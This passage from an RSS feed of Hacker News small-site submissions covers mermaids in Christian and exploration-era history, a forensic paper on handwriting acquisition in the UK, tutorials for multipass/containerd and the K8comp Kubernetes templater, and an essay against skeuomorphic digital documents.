<p>Ultimately, mermaids—hybrid creatures of myth and lore—symbolized the early Christian Churchâ€™s willingness to hybridize itself (that is, embrace a mix of pagan and Christian belief systems) in its larger attempts to cultivate the largest following possible. Here, the Christian Church deliberately adopted and adapted pagan symbols in its holy spaces, thereby bridging the gap between the supposedly â€˜savageâ€™ and the civilized; the past and the present. And it largely worked, as Christian doctrine steadily decentered symbols of the sacred feminine by the medieval period. However, such efforts had unexpected side effects, as by utilizing these hybrid monstrosities to support religious tenets the Christian Church legitimatized such creatures, which in turn created the foundation for belief and acceptance for generations to come.&nbsp;<br></p>
<p>The â€˜Age of Discoveryâ€™ (roughly 1500 to 1700 CE) only solidified Westernersâ€™ long-standing beliefs and cultural traditions surrounding merpeople. By 1492 Westerners had long lived in a world of merpeople: especially in wealthy, sea-faring societies like Venice or Genoa, merpeople became almost ubiquitous mainstays of art, ranging from tombs to tomes, sculptures to tableware. Unsurprisingly, by the time Westerners pushed further east and west into what were, for them, uncharted territories, they fully expected to find mermaids and tritons. They had, after all, lived their lives surrounded by these mysterious creatures. Importantly, before the â€˜Age of Discoveryâ€™, Europeans placed Jerusalem in the centre of the globe in terms of religious tradition. The further one got from Jerusalem, the stranger and more dangerous the world became. If merpeople lived anywhere, many early modern Westerners believed, it must be at the ends of the Earth, where monstrosities and curiosities thrived.&nbsp;</p>
<blockquote>The&nbsp;â€˜Age of Discoveryâ€™&nbsp;only solidified Westernersâ€™&nbsp;long-standing beliefs surrounding merpeople.<br></blockquote>
<p>As Westerners heightened their interactions with the Pacific and Atlantic worlds in a search for monetary, religious and imperial power, recorded sightings of merpeople multiplied exponentially. The Atlantic Ocean and its â€˜New Worldâ€™ shores were especially rife with such interactions, as famed explorers integrated merpeople into their understandings of strange—and potentially lucrative—environments. Yet, where in the medieval period interactions with mermaids and tritons usually uncovered a deeper lesson over lust, vanity or religion, early modern explorers transformed such contact beyond manifestations of the Christian creed and instead began to reflect in their â€˜mer-sightingsâ€™ emerging notions of exploration, growth and national prowess. Each Western country had its own stories of merpeople, and in each of these interactions the nation tried to assert its understanding of the globe. Monstrosities abounded in the New World, and Europeans were intent on uncovering their secrets. This was a period of legitimization for merpeople.&nbsp;</p>
<p>As sightings proliferated and European Christians steadily colonized the Americas, Western mapmakers began in earnest to chart these strange new worlds. Of course, such cartographic creations were as much about Europeâ€™s effort to position itself as a world power as they were about accurately recreating the New World topography. These maps were also, importantly, intended to demonstrate the exotic opportunity of the world, while also shrinking its size to suit Europeansâ€™ imperialist efforts. Therefore â€˜strangeâ€™ or â€˜foreignâ€™ lands like the Americas and the â€˜Far Eastâ€™ were often depicted with merpeople in their surrounding seas.This was no mistake, nor can it be boiled down to a temporary flight of fancy. Mapmakers intentionally included merpeople …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://oceans.nautil.us/feature/660/what-merpeople-say-about-us">http://oceans.nautil.us/feature/660/what-merpeople-say-about-us</a></em></p>]]>
            </description>
            <link>http://oceans.nautil.us/feature/660/what-merpeople-say-about-us</link>
            <guid isPermaLink="false">hacker-news-small-sites-25713617</guid>
            <pubDate>Sun, 10 Jan 2021 11:29:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Acquisition of Handwriting in the UK]]>
            </title>
            <description>
<![CDATA[
Score 22 | Comments 38 (<a href="https://news.ycombinator.com/item?id=25713526">thread link</a>) | @dcminter
<br/>
January 10, 2021 | http://www.unask.com/website/handwriting/new_web_pages/acquisition.htm | <a href="https://web.archive.org/web/*/http://www.unask.com/website/handwriting/new_web_pages/acquisition.htm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

The information in this paper is based on research done by Frances Brown
under my supervision; many of the ideas in it are hers, and many come from
collaborative discussion. The paper was originally given at the Criminalistic
Institute in Prague, and was written to be presented there. 

<p>


<strong>1. Introduction and theoretical base.</strong>This paper reports on a project that was undertaken in 1982-3,
funded by the Home Office. It came from the fact that while document examiners
in the UK know a great deal about what the handwriting of UK citizens is
like, and know in general terms how that handwriting was learned, they in
fact know very little about the way in which the learning of handwriting
actually goes on in schools. So the project began with a very general remit:
to investigate the way in which handwriting is taught and learned in the
UK. What it turned into was an investigation into the whole issue of the
relationship between the taught style of handwriting and the way in which
that handwriting is actually done.</p><p>

It was clear from the outset that there are two sources from which handwriting
is learned: from copybooks, and from teachers. The investigation thus split
into two: we used surveys and sampling investigation to find out how handwriting
is actually taught in schools, and we conducted an extensive examination
and analysis of a large sample of the copybooks used in the UK in the lifetime
of any contemporary adult. </p><p>

In general what the project showed was this. Handwriting of UK citizens
is, compared with that of those educated elsewhere in Europe or in America,
very various. No uniformity is imposed centrally, at the governmental level,
or locally, by Local Educational Authorities. There are several different
handwriting systems to be found in the available copybooks, and each copybook
may present its own version of the system it derives from. Individual schools
may favour particular systems or particular copybooks, but often it is left
to the individual teacher of handwriting to adopt whatever method they feel
comfortable with. Moreover, even at the beginning of learning to write it
is not usually expected or demanded that the child should faithfully copy
the learned system, and, later in life, it is common for teenagers who to
change their writing style to make it look beautiful. This is true for both
boys and girls, but the evidence is that girls spend a lot more time at
it. In fact handwriting that follows a copybook style closely is commonly
seen as 'immature', or 'naive', or 'lacking in personality'; and idiosyncratic
or unusual or even messy handwriting is seen as showing valuable personality
traits: individuality, creativity, and so on. As a result, the handwriting
of mature adults can vary considerably from the learned system, containing
a mixture of elements deriving from any combination of (1) the system itself,
(2) the particular copybook version of that system, (3) a school-teacher's
version of the copybook, (4) the individual's own idiosyncratic variation,
and (5) curious features that occur in no copybook but are nonetheless commonly
found, presumably having spread through the culture by some form of osmosis.
This means that when someone says: 'how would you characterize the handwriting
of the UK?' they are asking a question that is very hard to answer; in fact,
it is a question that no-one <cite>could</cite> answer before this project
was undertaken.</p><p>

So: the situation that we discovered is complex, but it is not chaotic.
General patterns were discovered, and interesting sub-patterns. Before giving
the detail of the findings, however, it is necessary to establish some terminology.</p><center><a href="http://www.unask.com/website/handwriting/new_web_pages/terms.htm"><strong>Summary of Terminology</strong></a>
</center>
<div><p>Handwriting in the UK is learned at school, usually beginning at the
age of 5 or so, by copying. What is copied is a formal <strong>system. </strong>We
discovered from a close analysis of some 50 handwriting copybooks, which
we believe represent all of the published styles available in the lifetime
of any adult, that their apparent diversity can be reduced to four basic
systems: <strong>Print Script, Round Hand, Looped Cursive, </strong>and<strong>
Italic.</strong> However the actual version of the system that the child
copies will normally come from a particular copybook, which may have its
own variation or dialect of the basic system; or what a child actually copies
may be work materials prepared by a teacher, with the teacher's own variations
added. If a child moves from one school or even one teacher to another,
he or she may be exposed to two different copybooks or even two different
systems. Nonetheless, it is usually possible to detect traces of the system,
though not the actual copy book version of it, that a given person has been
taught.</p><p>

By repeated attempts to copy this basic pattern the child learns the necessary
skills of motor-co-ordination. The child first learns Print Script, a simple
unjoined alphabet, and then learns a joined style based one of the other
three main systems. As the mature hand develops, eventually by the end of
the teenage years evolving into the stable final hand that will (usually)
serve the individual for the rest of his or her life, two kinds of characteristic
can be ascertained. We call these <strong>individual characteristics</strong>
and <strong>style characteristics</strong> . Individual characteristics
are those components of a given hand that make it unique: they are what
document examiners are mainly interested in. But in each hand there will
also be a residual set of style characteristics: those elements which are
shared with other members of a group or groups. Style characteristics come
in three kinds: <strong>system characteristics</strong> , that serve to
identify which of the four general classes or systems the learned style
derives from; <strong>copybook characteristics</strong> , that can definitely
be linked to a particular copybook version of the basic system; and, finally,
what we call <strong>underground characteristics</strong> , which are those
features which are shared with other writers, but which do not occur in
any copybook. So for example the following letter-forms, familiar to all
UK handwriting examiners, are not as far as we know part of any of the basic
systems or their copybook dialects:</p></div><center><a href="http://www.unask.com/website/handwriting/new_web_pages/underground.htm"><strong>Underground characteristics</strong></a><strong>.</strong>
</center>
<div><p>Some underground characteristics may actually be learned at the stage
when handwriting is initially acquired, deriving from the practice of teachers
who modify the copybook system that they teach, for whatever reason, thus
incorporating underground characteristics at this early stage. Normally,
however, they seem to be picked up later, presumably by imitation.</p><p>

Since in the UK (and in other countries too) the normal process of teaching
handwriting is to teach first one system, the unjoined Print Script, and
then a second, cursive or joined up system, it is the latter that normally
is the basis of the set of system characteristics in the mature hand. Rather
confusingly, however, the original Print Script is not seen as being a system
at all, but as 'basic writing', which is then 'joined up', under the influence
of some taught system, to form a cursive style. In fact what happens is
that two successive <cite>systems</cite> are learned, the latter superseding
the former: Print Script is as much a copybook system, with a history and
a designer, as any other. But because of the misconception that Print Script
is not a system, this form is not often seen in adult handwriting. It is
widely associated with semi-literacy, where the writer is assumed not to
have progressed on to the 'joined up' writing.</p><p>

The case of capitals is also curious. The child learns two forms: Print
Script is taught in a lower and upper case form. The cursive scripts that
follow it also have their own particular kind of capitals, and these are
learned; but they are only used when the writer is doing their normal writing.
When an adult is required to fill in a form and asked to write in capitals
for the purpose of clarity, they will usually produce Print Script capitals.
(The practice found elsewhere in Europe of producing a print script lower
case form when asked to write clearly--to 'print'--is rare in the UK.) These
Print Script capitals are known as <strong>block capitals</strong> , and
considered (incorrectly) to be a separate style: they are not associated
in most people's minds with the 'childish' style of Print Script. Since
for most people filling in forms is only a small part of the writing that
they do, block capitals are not much practiced and therefore retain quite
purely their Print Script style: they are less embellished than cursive
writing with individual or underground characteristics. Therefore block
capitals are commonly used in writing that wishes to remain anonymous. However,
some writers have more practice than others in writing block capitals, and
they have evolved styles of their own. All of these styles are underground:
no style of block capitals other than Print Script is taught or published.</p></div><center><a href="http://www.unask.com/website/handwriting/new_web_pages/caps.htm"><strong>Styled Block Capitals</strong> </a></center>
<div><p>As far as document examiners are concerned the relevance of this outline
of handwriting acquisition is as follows. The part of their job that concerns
handwriting examination can be said to have two aspects: <strong>identification</strong>
and <strong>categorization</strong> . Identification deals with those tasks
that involve stating whether or not a particular piece of writing was, or
was not, written by a particular individual. Categorization deals with the
problem of anonymous writing, and involves saying whatever can be said to
describe the anonymous writer. For example: was this writing done by someone
who was left-handed? At the moment the former is far more important, partly
because relatively little proper research has been done on the latter. </p><p>

Categorization deals entirely--by definition--with style characteristics:
those characteristics that are shared with other writers. Identification
deals with both: with individual characteristics--again, by definition--but
also with style characteristics, since in particular cases the appearance
of certain of these in a particular hand may serve to distinguish the …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.unask.com/website/handwriting/new_web_pages/acquisition.htm">http://www.unask.com/website/handwriting/new_web_pages/acquisition.htm</a></em></p>]]>
            </description>
            <link>http://www.unask.com/website/handwriting/new_web_pages/acquisition.htm</link>
            <guid isPermaLink="false">hacker-news-small-sites-25713526</guid>
            <pubDate>Sun, 10 Jan 2021 11:18:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[containerd development with multipass]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25713259">thread link</a>) | @alexellisuk
<br/>
January 10, 2021 | https://blog.alexellis.io/containerd-development-multipass/ | <a href="https://web.archive.org/web/*/https://blog.alexellis.io/containerd-development-multipass/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    <article>

        

        <section>
            <div><p>About 18 months ago <a href="https://blog.alexellis.io/faas-containerd-serverless-without-kubernetes/">I started a project</a> which developed directly against containerd. This presented a problem which I'd not really encountered before - <a href="https://www.docker.com/">Docker</a> and <a href="https://kubernetes.io/">Kubernetes</a> on my Mac were no longer enough, I needed a Linux environment.</p>
<p>To begin with I just used an old 2016 model Dell XPS which gave me everyting I needed, but when others started to contribute, they were using Macs and so we had a problem. <a href="https://multipass.run/">Multipass</a> was the answer to our woes and we were pleasantly surprised by it and wondered why more people weren't using it every day.</p>
<p>I want to tell you a bit about our experience in the <a href="http://github.com/openfaas/">OpenFaaS community</a> developing <a href="https://github.com/openfaas/faasd">faasd</a> - a portable FaaS framework, just like OpenFaaS, but without the complexity and overheads of a Kubernetes cluster.</p>
<h2 id="whatscontainerdeverdoneforus">What's containerd ever done for us?</h2>
<p>Some time ago the original version of Docker was actually written in Python, and then morphed over time into a Go re-write. The Go version was seen as monolithic by some consumers, particularly the Kubernetes community.</p>
<blockquote>
<p>Docker did many things, and at one point clustering and multi-node orchestration was even added to that list (think Docker Swarm and Docker EE)</p>
</blockquote>
<p>As the codebase was refactored two projects emmerged: containerd and runc.</p>
<ul>
<li><a href="https://github.com/opencontainers/runc">runc</a> was a tiny Go binary that had one job: run a container based upon a spec. runc was also the driver for the <a href="https://opencontainers.org/">OCI specification</a></li>
<li><a href="https://github.com/containerd/containerd">containerd</a>'s job was to get things ready for runc - such as pulling images and defining specs</li>
</ul>
<p>Docker then remained as a thiner layer on top of both of these tools to bring a user-friendly developer-experience, networking, high-level API and CLI.</p>
<p>Over time containerd has shifted into the lime-light and in Kubernetes 1.20, it will take over duties for running containers in Kubernetes clusters. Now not a lot changes, because containerd was always there along with runc, we just skip a few levels of indirection.</p>
<p>containerd doesn't provide networking out of the box, and that was one of the hardest challenges.</p>
<blockquote>
<p>Not because it's technically complex, but there was a severe lack of documentation.</p>
</blockquote>
<p><a href="https://github.com/containernetworking/cni">Container Network Initiative (CNI)</a> filled a gap for us and enabled us to build a network between our containers.</p>
<p>When you squint at faasd, you see something that looks a lot like a single-node Kubernetes cluster, using the same projects you'd find on most nodes: containerd, runc and CNI.</p>
<h2 id="whywouldyoudevelopwithcontainerd">Why would you develop with containerd?</h2>
<p>There were two main reasons for creating "faasd" - the first was that we were hearing from users that they didn't want to run an entire Kubernetes cluster just to run a handful of functions, APIS or webpages. The second was that I fancied doing some learning and low-level coding.</p>
<p>Whilst containerd has a socket available, and can be mounted or forwarded, it doesn't work as you would expect. The containerd client tries to run containers on the host it's executing on and just synchronises state with the containerd socket. I found that very confusing, but was reassured that is the way it was designed to work.</p>
<p>You can see our code which has developed into two main services shipped in a single binary.</p>
<ul>
<li><a href="https://github.com/openfaas/faasd/blob/master/cmd/up.go">faasd</a> - starts all the core services for OpenFaaS: the gateway, NATS, Prometheus and our queue worker. <a href="https://github.com/openfaas/faasd/blob/master/docker-compose.yaml">A docker-compose file</a> is used to define versions of images, and the dependency graph for starting up services.</li>
<li><a href="https://github.com/openfaas/faasd/tree/master/pkg/provider">faasd-provider</a> - a HTTP interface that performs invoke and CRUD for functions and secrets</li>
</ul>
<p>Both are installed with systemd unit files, it was refreshing to lean on the host system for once, instead of using abstractions.</p>
<h3 id="theshortversion">The short-version</h3>
<p><a href="https://multipass.run/">multipass</a> is a <a href="https://canonical.com/">Canonical</a> and its open source components and usage instructions are <a href="https://github.com/canonical/multipass">available on GitHub</a>.</p>
<blockquote>
<p>Multipass is a lightweight VM manager for Linux, Windows and macOS. It's designed for developers who want a fresh Ubuntu environment with a single command.</p>
<p>Since it supports metadata for cloud-init, you can simulate a small cloud deployment on your laptop or workstation.</p>
</blockquote>
<p>On MacOS it is currently using hyperkit to run VMs, which is another thing we can thank Docker for building. On Windows and Linux it uses different virtualization technology, but has the same simple user-experience which means we get to write one tutorial and to be done with it. As a busy maintainer, I see that as a big win.</p>
<p>Here's how you get a VM launched with the latest version of Ubuntu Server:</p>
<pre><code>multipass launch --name faasd
</code></pre>
<p>Shell into the VM:</p>
<pre><code>multipass exec faasd /bin/bash
</code></pre>
<p>We then realised that multipass supported cloud-init, so morphed our README to the following:</p>
<pre><code>curl -sSLO https://raw.githubusercontent.com/openfaas/faasd/master/cloud-config.txt
multipass launch --cloud-init cloud-config.txt  --name faasd
</code></pre>
<p>I had the pleasure of speaking to the engineering manager and PM for multipass on Zoom today and they told me you can even pass the cloud-init file as a URL, so our tutorial becomes even simpler:</p>
<pre><code>multipass launch --cloud-init https://raw.githubusercontent.com/openfaas/faasd/master/cloud-config.txt  --name faasd
</code></pre>
<p>From there, you have a full Linux system with a working version of containerd and Container Network Initiative (CNI) plugins running, and most importantly faasd is up and running.</p>
<pre><code>faas-cli list
faas-cli store deploy figlet
faas-cli invoke figlet &lt;&lt;&lt; "faasd"
</code></pre>
<p>Whilst I've not used it yet, I'm told you can also mount folders from your base system to synchronise your GOPATH. So you could write code using VSCode and have the built-in terminal pane running "multipass exec /bin/bash" or an ssh session.</p>
<p>I recently wrote a post on <a href="https://blog.alexellis.io/memory-lane-raspberry-pi-zero/">One last trip down memory lane with the Raspberry Pi Zero</a> where I tried to port faasd to a Raspberry Pi Zero. The Go build for faasd was taking so long that I gave up, opened multipass and cross-compiled it. That whole process was quicker than waiting for the poor little armv6 service to finish its work.</p>
<h3 id="multipassforkubernetes">multipass for Kubernetes</h3>
<p>You can also use multipass to run other workloads, I tried to deploy Kubernetes with microk8s, but ran into some issues with the default limits.</p>
<p>First of all: there was not enough RAM alloacted, then there was not enough disk, finally there were not enough vCPUs. After working all that out I came up with the following:</p>
<pre><code>multipass launch --name microk8s -m 8G -c 2 -d 80G
</code></pre>
<p>Now it's not that much of a surprise that we never ran into that issue, because faasd is designed to be ridicuously lean. It even runs on a Raspberry Pi 3 which only has 1GB of RAM.</p>
<h2 id="wrappingup">Wrapping up</h2>
<p>multipass has been useful for us whenever we need to access a Linux VM from a Mac. It could even be used for running a Kubernetes cluster, but I would usually prefer to deploy Kubernetes in a Docker container using either <a href="https://kind.sigs.k8s.io/">KinD</a> or <a href="https://github.com/rancher/k3d">k3d</a> for the sheer speed and efficiency of it.</p>
<p>multipass is a much leaner alternative to tooling like VirtualBox and Vagrant. The team are looking for feedback and are already planning for a way to launch custom images. Think: <code>multipass launch openfaas</code> or <code>multipass launch gitlab</code> for instance.</p>
<blockquote>
<p>We see multipass being an important part of enabling collaboration with users from all-over the world, whether they use Linux, MacOS or Windows on their desktop.</p>
</blockquote>
<p>Around 20 people have contributed to faasd directly, and many more indirectly. It worked very well for us and we believe that multipass deserves more attention.</p>
<p>Go and try it out, let them know what works for you and where it can be improved for your workflow.</p>
<blockquote>
<p>Users have already suggested using <a href="https://github.com/canonical/multipass/issues?q=is%3Aissue+is%3Aopen+qemu">qemu on MacOS</a>, and the new <a href="https://developer.apple.com/documentation/virtualization">Virtualization.Framework</a> introduced in Big Sur could also have some impact on the future roadmap and M1 support.</p>
</blockquote>
<ul>
<li><a href="https://multipass.run/">multipass.run</a></li>
</ul>
<h3 id="whataboutfaasdvsopenfaasonkubernetes">what about faasd vs. OpenFaaS on Kubernetes?</h3>
<p>faasd now fills a nice gap where Docker Swarm used to live in the OpenFaaS ecosystem. If you're working your way up to production with Kubernetes, or already have experience then you may benefit from a cluster and installing OpenFaaS to it.</p>
<p>If you're wanting to run a few functions, start small, keep costs down, then faasd may be a better fit. Managing and keeping up with Kubernetes versions can be its own challenge. So if you want to deploy code for a customer and barely give it another thought, then package faasd as a VM or cloud-init script and be done with it.</p>
<p>faasd can be run for 5-10 USD on a cloud VPS, or on your Raspberry Pi for free using <a href="https://docs.inlets.dev/">an inlets tunnel</a> to get it a public IP address.</p>
<p>Learn more about faasd and OpenFaaS at our Birthday event - join us on the 18th and participate in the Prize Draw too: <a href="https://github.com/openfaas/faas/issues/1592">Save the date 🎂 - OpenFaaS 4th birthday!</a></p>
<p>Did you enjoy this article? Follow me through GitHub Sponsors and get a weekly email from me and regular updates on my OSS work: <a href="https://github.com/sponsors/alexellis">github.com/sponsors/alexellis</a></p>
</div>
        </section>

        

    </article>
</div></div>]]>
            </description>
            <link>https://blog.alexellis.io/containerd-development-multipass/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25713259</guid>
            <pubDate>Sun, 10 Jan 2021 10:40:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[K8comp: K8s Templater]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25713200">thread link</a>) | @based2
<br/>
January 10, 2021 | https://cststack.github.io/k8comp/ | <a href="https://web.archive.org/web/*/https://cststack.github.io/k8comp/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
				<p>K8comp is a tool which substitutes any templates variables declared in the format %{VARIABLE default “DEFAULT_VALUE”} or %{VARIABLE} with values from a files hierarchy using <a href="https://rubygems.org/gems/hiera/versions/3.2.0">hiera</a>.</p>

<p>AWS Secrets Manager is also supported with the following variables format, AWSSM(BASE64,aws-secret-manager-id) from hiera or %{AWSSM(BASE64,aws-secret-manager-id)} from templates. Check the <a href="https://cststack.github.io/k8comp04-how-to/02-encrypt-variables/#aws-sm-secret">How to</a> section of the documentation for more details.</p>

<p>The tool was created to simplify apps deployments for Kubernetes but it can be used to template any other type of files.</p>

<p>K8comp doesn’t interact with Kubernetes API in any way which means is not tight to any Kubernetes version, it just prints to stdout the deployment files. Because of this the user needs to make sure the deployment files are compatible with the Kubernetes version where the files will be deployed.</p>

<p>To install k8comp as helm plugin use:</p>
<div><div><pre><code>helm plugin install https://github.com/cststack/k8comp
</code></pre></div></div>

<blockquote>
  <p>To deploy/delete apps using k8comp just pipe everything to kubectl. K8comp requires kubectl to be installed and configured locally.</p>
</blockquote>

<p>How k8comp works?
<img src="https://cststack.github.io/k8comp/assets/docs-images/template-processing.png" alt="how-it-works"></p>

<h2 id="goals"><a href="#goals"></a>Goals</h2>

<ul>
  <li>use the default yaml/json Kubernetes syntax</li>
  <li>to have a templates library which can be used in multiple environments and be version controlled using GIT</li>
  <li>have full control of all deployable resources without a complicated deployment setup</li>
  <li>store any secrets encrypted in a GIT repository</li>
</ul>

<h2 id="features"><a href="#features"></a>Features</h2>

<ul>
  <li>support for yaml, json, yml</li>
  <li>encrypted variables using eyaml</li>
  <li>multiline variables (only for yaml files)</li>
  <li>auto git pull on deployment or manual git pull via <code>k8comp pull</code></li>
  <li>multi branch deployment</li>
  <li>support for remote templates</li>
  <li>use as helm plugin</li>
  <li>support for AWS Secrets Manager
    <div><div><pre><code>helm plugin install https://github.com/cststack/k8comp
</code></pre></div>    </div>
  </li>
</ul>

<h2 id="quick-start"><a href="#quick-start"></a>Quick start</h2>

<p>The easiest way to start using k8comp is with <a href="https://hub.docker.com/r/cststack/k8comp-ci-ssh/">docker CI container</a></p>

<p>1) Create a local folder to store the projects</p>

<p>2) Run the latest k8comp CI container</p>
<div><div><pre><code>cd k8comp-projects
docker run -v `pwd`:/home/jenkins/code -it cststack/k8comp-ci-ssh bash
cd code
</code></pre></div></div>
<p>3) Pull the default hiera.yaml</p>
<div><div><pre><code>curl -o hiera.yaml https://raw.githubusercontent.com/cststack/k8comp/master/examples/defaults/hiera.yaml
</code></pre></div></div>
<p>4) Generate the eyaml keys. The keys will be generated in ./keys folder</p>

<p>5) Create projects and hieradata folders structure</p>
<div><div><pre><code>mkdir -p hieradata/apps/nginx/
mkdir -p projects/nginx
</code></pre></div></div>
<p>6) Pull the nginx example</p>
<div><div><pre><code>curl -o projects/nginx/deployment.yaml https://raw.githubusercontent.com/cststack/k8comp-app-hiera-examples/master/projects/nginx/deployment.yaml
curl -o projects/nginx/ingress.yaml https://raw.githubusercontent.com/cststack/k8comp-app-hiera-examples/master/projects/nginx/ingress.yaml
curl -o projects/nginx/service.yaml https://raw.githubusercontent.com/cststack/k8comp-app-hiera-examples/master/projects/nginx/service.yaml
</code></pre></div></div>
<p>7) Pull the hieradata common.yaml, development.yaml and production.yaml examples</p>
<div><div><pre><code>curl -o hieradata/common.yaml https://raw.githubusercontent.com/cststack/k8comp-app-hiera-examples/master/hieradata/common.yaml
curl -o hieradata/apps/nginx/development.yaml https://raw.githubusercontent.com/cststack/k8comp-app-hiera-examples/master/hieradata/apps/nginx/development.yaml
curl -o hieradata/apps/nginx/production.yaml https://raw.githubusercontent.com/cststack/k8comp-app-hiera-examples/master/hieradata/apps/nginx/production.yaml
</code></pre></div></div>
<p>8) Test the deployment</p>
<div><div><pre><code>k8comp -a nginx -e development
</code></pre></div></div>
<p>or for production environment</p>
<div><div><pre><code>k8comp -a nginx -e production
</code></pre></div></div>

<p>To deploy the example pipe the output to kubectl.</p>
<blockquote>
  <p>Make sure the ~/.kube/config is available in the container.</p>
</blockquote>

<p>9) <code>Ctrl</code>+<code>d</code> to exit the container. All the files generated are now available on the local folder created. The files can now be saved on a single or mutiple GIT repositories.</p>

			</article></div>]]>
            </description>
            <link>https://cststack.github.io/k8comp/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25713200</guid>
            <pubDate>Sun, 10 Jan 2021 10:31:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a Hacker Space (2007) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25712952">thread link</a>) | @Tomte
<br/>
January 10, 2021 | https://events.ccc.de/congress/2007/Fahrplan/attachments/1003_Building%20a%20Hacker%20Space.pdf | <a href="https://web.archive.org/web/*/https://events.ccc.de/congress/2007/Fahrplan/attachments/1003_Building%20a%20Hacker%20Space.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://events.ccc.de/congress/2007/Fahrplan/attachments/1003_Building%20a%20Hacker%20Space.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25712952</guid>
            <pubDate>Sun, 10 Jan 2021 09:52:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mercedes invented Autopilot in the '80s [video]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25712929">thread link</a>) | @julius
<br/>
January 10, 2021 | https://tilvids.com/videos/watch/ca5ec9f2-02a9-48c6-84fa-58f5b7349f94 | <a href="https://web.archive.org/web/*/https://tilvids.com/videos/watch/ca5ec9f2-02a9-48c6-84fa-58f5b7349f94">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://tilvids.com/videos/watch/ca5ec9f2-02a9-48c6-84fa-58f5b7349f94</link>
            <guid isPermaLink="false">hacker-news-small-sites-25712929</guid>
            <pubDate>Sun, 10 Jan 2021 09:49:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Death to the Document]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25712829">thread link</a>) | @dyates
<br/>
January 10, 2021 | https://davidyat.es/2021/01/10/death-to-the-document/ | <a href="https://web.archive.org/web/*/https://davidyat.es/2021/01/10/death-to-the-document/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    <article>
    



    
    <time datetime="2021-01-10 09:53:50 +0200">10 January 2021</time>
    



    
    

    <section>
      <p>Until quite recently, the South African Revenue Service’s online tax filing website required Adobe Flash. This aged web plugin allowed SARS to embed editable tax forms in the e-Filing web application. The result looked like this:</p>
<figure>
  <img src="https://davidyat.es/content/images/2019/08/efiling.png" alt="Taxes and Flash: a match made in Hell" loading="lazy">
  <figcaption>
    <p>Taxes and Flash: a match made in Hell</p>
  </figcaption>
</figure>

<p>That’s right, Flash was used to produce a high-fidelty computer simulation of the experience of filling in paper forms with text in block capital letters. Move over, <em>Euro Truck Simulator</em>. Untold hours of development time went into this. Despite standard HTML having supported a wide variety of superior-to-paper form capabilities since the 90s, this happened. And had Flash’s December deprecation not forced a total redesign, this marvel of overengineering would still be with us today.</p>
<p>I’ve come up with a term for this kind of thing: <strong>toxic skeumorphism</strong>. Toxic skeumorphism happens when you simulate the limitations of physical objects in the digital realm for no good reason.</p>
<p>Flash-based tax forms are the ur-example of toxic skeumorphism, but this disease expands far beyond them. More subtle examples include Word documents and PDFs. Think about the last Word document you created. Do you ever intend to print it out? If not, then why did you compose it on fake paper? What benefit did the arbitrary size and shape of those fake pages confer on your writing?</p>
<p>A related phenomenon that highly irritates me is the practice of emailing and scanning paper forms. Standard practice for all kinds of businesses, at least where I live, is to email people paper forms so they can print them out, fill them in and sign them, and then email back scanned copies. I always fill them in with GIMP, because I don’t have a printer and my handwriting is atrocious. I have a picture of my signature I paste in where required, rendering the already weak authentication control that is handwritten signatures entirely meaningless.</p>
<p>The alternatives, services like DocuSign, represent a massive improvement over this status quo, but are still wedded to skeumorphism, showing fake paper forms and fake written signatures. They’re also centralised authorities, and thus not really a robust and accessible solution. A digital-native to this problem has to involve cryptography, i.e. actually meaningful signatures that can be verified. Ideally this would be an open standard.</p>
<figure>
  <img src="https://davidyat.es/content/images/2021/01/sig.png" alt="Mouse-drawn signatures aren&amp;rsquo;t great either." loading="lazy">
  <figcaption>
    <p>Mouse-drawn signatures aren’t great either.</p>
  </figcaption>
</figure>

<p>As a child growing up in the late 90s/2000s, I saw and used representations of paper folders on computer screens before ever coming across the real thing. This must be even more prevalent for younger people. Computers have been the ubiquitous way to deal with information for many decades now, and so it’s way past time we let go of skeumorphisms designed to transition office workers from physical papers, folders and desktops. To entomb information in dead paper documents is one thing, but to do so using simulated dead paper documents is downright heretical. Ted Nelson laments this in the video I included in my <a href="https://davidyat.es/2020/05/23/roam-research/">Roam post</a>, reproduced below.</p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/1yLNGUeHapA" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
<p>Freed from the arbitrary boundaries of the printed page, we can have text that scales to different display sizes, that can be turned into audio, processed using your favourite programming language, enriched with relevant links, and shared among people in a form that allows editing and commentary, while still always showing the same canonical version to everyone, without the need for manual merges. We have much of this, to varying degrees in the different places, but we cling to paper-sized pages and the idea of the document as an artefact either dead or on its way to death; developed collaboratively up to a point and then mummified as a PDF.</p>
